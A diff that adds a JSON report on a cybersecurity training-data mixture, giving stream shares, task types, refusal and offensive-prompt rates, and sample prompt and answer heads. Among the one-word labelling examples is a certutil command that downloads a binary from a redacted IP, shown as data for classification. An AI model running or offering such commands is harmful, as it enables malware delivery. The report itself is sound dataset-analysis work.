@@ -1,0 +1,236 @@
+{
+ "artifact": "<programme-tree>/data/v3/mixture/mixture-v3-no-trail.jsonl",
+ "rows": 140545,
+ "composition_by_stream": {
+  "fenrir": {
+   "rows": 99730,
+   "share_pct": 70.96
+  },
+  "merged": {
+   "rows": 23146,
+   "share_pct": 16.47
+  },
+  "refusal": {
+   "rows": 9584,
+   "share_pct": 6.82
+  },
+  "primus": {
+   "rows": 4891,
+   "share_pct": 3.48
+  },
+  "format": {
+   "rows": 2600,
+   "share_pct": 1.85
+  },
+  "replay": {
+   "rows": 594,
+   "share_pct": 0.42
+  }
+ },
+ "task_type_by_stream": {
+  "fenrir": {
+   "other": {
+    "rows": 99625,
+    "pct_of_stream": 99.89
+   },
+   "sigma_rule": {
+    "rows": 105,
+    "pct_of_stream": 0.11
+   }
+  },
+  "merged": {
+   "cwe_root_cause": {
+    "rows": 18282,
+    "pct_of_stream": 78.99
+   },
+   "cve_to_cwe": {
+    "rows": 2760,
+    "pct_of_stream": 11.92
+   },
+   "other": {
+    "rows": 1562,
+    "pct_of_stream": 6.75
+   },
+   "cvss_scoring": {
+    "rows": 542,
+    "pct_of_stream": 2.34
+   }
+  },
+  "refusal": {
+   "other": {
+    "rows": 9584,
+    "pct_of_stream": 100.0
+   }
+  },
+  "format": {
+   "other": {
+    "rows": 1444,
+    "pct_of_stream": 55.54
+   },
+   "one_word_label": {
+    "rows": 688,
+    "pct_of_stream": 26.46
+   },
+   "sigma_rule": {
+    "rows": 468,
+    "pct_of_stream": 18.0
+   }
+  },
+  "primus": {
+   "cve_to_cwe": {
+    "rows": 2767,
+    "pct_of_stream": 56.57
+   },
+   "other": {
+    "rows": 1581,
+    "pct_of_stream": 32.32
+   },
+   "cvss_scoring": {
+    "rows": 543,
+    "pct_of_stream": 11.1
+   }
+  },
+  "replay": {
+   "other": {
+    "rows": 594,
+    "pct_of_stream": 100.0
+   }
+  }
+ },
+ "answer_length_median_chars_by_stream": {
+  "fenrir": 2550,
+  "merged": 2566,
+  "refusal": 479,
+  "format": 67,
+  "primus": 3150,
+  "replay": 1314
+ },
+ "offensive_intent_prompt_rate_by_stream": {
+  "fenrir": 1.53,
+  "merged": 0.38,
+  "refusal": 10.43,
+  "format": 0.0,
+  "primus": 1.74,
+  "replay": 0.0
+ },
+ "defensive_pivot_answer_rate_by_stream": {
+  "fenrir": 1.61,
+  "merged": 0.17,
+  "refusal": 71.62,
+  "format": 0.0,
+  "primus": 0.06,
+  "replay": 0.34
+ },
+ "rows_where_offensive_prompt_got_defensive_answer": {
+  "n": 709,
+  "pct_of_offensive_prompt_rows": 26.29
+ },
+ "attack_vocabulary_prompt_rate_by_stream": {
+  "fenrir": 27.85,
+  "merged": 30.96,
+  "refusal": 29.55,
+  "format": 13.62,
+  "primus": 54.81,
+  "replay": 0.34
+ },
+ "attacker_framing_prompt_rate_by_stream": {
+  "fenrir": 8.81,
+  "merged": 24.14,
+  "refusal": 1.42,
+  "format": 0.0,
+  "primus": 31.45,
+  "replay": 0.0
+ },
+ "refusal_opening_style_by_stream": {
+  "refusal": 5880
+ },
+ "refusal_opening_share_of_refusal_stream": 61.35,
+ "coverage_probe_hits": {
+  "note": "count of corpus rows whose PROMPT asks for this task type; an absence is the finding, not a rounding error",
+  "rows_scanned": 140545,
+  "hits": {
+   "cve_or_cwe_analysis": 27433,
+   "threat_hunting": 1623,
+   "incident_response_runbook": 615,
+   "sigma_rule_authoring": 573,
+   "alert_triage_workflow": 452,
+   "vulnerability_management": 222,
+   "prompt_injection_defence": 194,
+   "false_positive_analysis": 11,
+   "ioc_extraction": 3,
+   "log_or_event_summarisation": 1
+  }
+ },
+ "examples": {
+  "fenrir": [
+   {
+    "task": "sigma_rule",
+    "user_head": "Under what circumstances might advanced threat actors circumvent Threat hunting using Sigma rules, and which layered defensive measures would you impl",
+    "asst_head": "Advanced threat actors can circumvent threat hunting using Sigma rules through several sophisticated techniques that exploit the inherent limitations "
+   },
+   {
+    "task": "sigma_rule",
+    "user_head": "Which detection engineering techniques (e.g., sigma rules, YARA) can most reliably capture indicators of Social Engineering with Phishing Kits without",
+    "asst_head": "Detection engineering for social engineering and phishing kits requires a multi-layered approach combining signature-based and behavioral analytics to"
+   },
+   {
+    "task": "sigma_rule",
+    "user_head": "Why do conventional analytics pipelines often miss signals related to Implementing Sigma rules for cloud-native environments, and which enrichment lay",
+    "asst_head": "## Causal Analysis\n\n**Direct Answer:** Conventional analytics pipelines miss cloud-native Sigma rule signals primarily due to architectural mismatches"
+   }
+  ],
+  "merged": [
+   {
+    "task": "cvss_scoring",
+    "user_head": "Analyze the following CVE description and calculate the CVSS v3.1 Base Score. Determine the values for each base metric: AV, AC, PR, UI, S, C, I, and ",
+    "asst_head": "**Initial Vulnerability Analysis**\nWe begin by thoroughly analyzing the CVE description to understand the nature and impact of the vulnerability. The "
+   },
+   {
+    "task": "cwe_root_cause",
+    "user_head": "cwe_id:CWE-319\ncwe_name:Cleartext Transmission of Sensitive Information\naffected_line:  <li>APPENDIX D of <a href=\"http://www.pkware.com/documents/cas",
+    "asst_head": "First, the user is asking about CWE-319: Cleartext Transmission of Sensitive Information. I need to analyze this vulnerability, explain its root cause"
+   },
+   {
+    "task": "cwe_root_cause",
+    "user_head": "cwe_id:CWE-319\ncwe_name:Cleartext Transmission of Sensitive Information\naffected_line:  <li><a href=\"http://java.sun.com/docs/books/tutorial/uiswing/c",
+    "asst_head": "First, the user is asking about the potential consequences of not addressing the vulnerability. The vulnerability is CWE-319: Cleartext Transmission o"
+   }
+  ],
+  "refusal": [],
+  "format": [
+   {
+    "task": "one_word_label",
+    "user_head": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8097 cmd=certutil -urlcache -split -f http://<ip-address>/p.bin p.bin",
+    "asst_head": "malicious"
+   },
+   {
+    "task": "one_word_label",
+    "user_head": "Answer with exactly one word - _malicious_ or _benign_: host=ws-4088 net_conn dst=<ip-address>:4444 bytes=130926 duration=337s",
+    "asst_head": "malicious"
+   },
+   {
+    "task": "sigma_rule",
+    "user_head": "Write a Sigma rule that would detect privilege escalation identified by shadow copy deletion in process creation. Output only the YAML, with a complet",
+    "asst_head": "title: Detect privilege escalation identified by shadow copy deletion in process creation\nid: 73c94950-0b81-3fac-768f-ea3bc571265e\nstatus: experimenta"
+   }
+  ],
+  "primus": [
+   {
+    "task": "cve_to_cwe",
+    "user_head": "Analyze the following CVE description and map it to the appropriate CWE. Provide a brief justification for your choice. Ensure the last line of your r",
+    "asst_head": "<|reserved_special_token_0|>**Initial CVE Analysis**\nReviewing the provided CVE description: The Auth0 Next.js SDK before version 1.6.2 does not filte"
+   },
+   {
+    "task": "cvss_scoring",
+    "user_head": "Analyze the following CVE description and calculate the CVSS v3.1 Base Score. Determine the values for each base metric: AV, AC, PR, UI, S, C, I, and ",
+    "asst_head": "<|reserved_special_token_0|>**Initial Vulnerability Analysis**\nWe are analyzing a use-after-free vulnerability in the Linux kernel's AMD power managem"
+   },
+   {
+    "task": "cve_to_cwe",
+    "user_head": "Analyze the following CVE description and map it to the appropriate CWE. Provide a brief justification for your choice. Ensure the last line of your r",
+    "asst_head": "<|reserved_special_token_0|>Okay, let's tackle this CVE analysis. The task is to map the given CVE description to the appropriate CWE. The description"
+   }
+  ],
+  "replay": []
+ }
+}
